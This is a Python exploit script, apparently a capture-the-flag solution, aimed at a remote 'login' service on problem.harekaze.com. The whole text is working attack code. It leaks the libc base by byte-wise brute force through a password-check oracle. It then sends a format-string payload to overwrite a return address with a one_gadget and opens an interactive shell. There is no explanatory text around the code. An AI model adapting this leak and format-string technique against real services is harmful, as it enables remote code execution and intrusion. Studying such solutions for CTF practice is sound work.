from ptrlib import *

libc = ELF("./libc.so.6")
#sock = Process("./login")
sock = Socket("problem.harekaze.com", 20002)
one_gadget = 0x4f322

## leak libc base
leaked_addr = []
pre_candidate = []
ofs = 0x10
for l in range(ofs, ofs + 6):
    candidate = []
    for c in range(0x100):
        if c == ord('\n') or c == ord('\r') or c == ord('A'): continue
        sock.recvuntil(": ")
        sock.sendline("{}".format(l))
        sock.recvuntil(": ")
        sock.send("A" * l)
        sock.recvuntil(": ")
        sock.sendline(chr(c))
        r = sock.recvline()
        if b'Invalid password' not in r:
            candidate.append(c)
            sock.sendline("abc123")
        if len(candidate) >= ofs + 6 - l:
            break
    for c in pre_candidate:
        if c not in candidate:
            leaked_addr.append(c)
            break
    pre_candidate = list(candidate)
leaked_addr.append(candidate[0])
addr = u64(bytes(leaked_addr))
libc_base = addr - 0x61aa98
dump("libc base = " + hex(libc_base))

## overwrite the return address
sock.recvuntil(": ")
sock.sendline("79")
sock.recvuntil(": ")
sock.sendline("a]%11$llu")
sock.recvuntil(": ")
sock.send("a ")
sock.sendline(str(libc_base + one_gadget))

## get the shell!
sock.sendline("79")
sock.sendline("a")
sock.sendline("a")
sock.sendline("a")
sock.recvuntil("bye.\n")

sock.interactive()
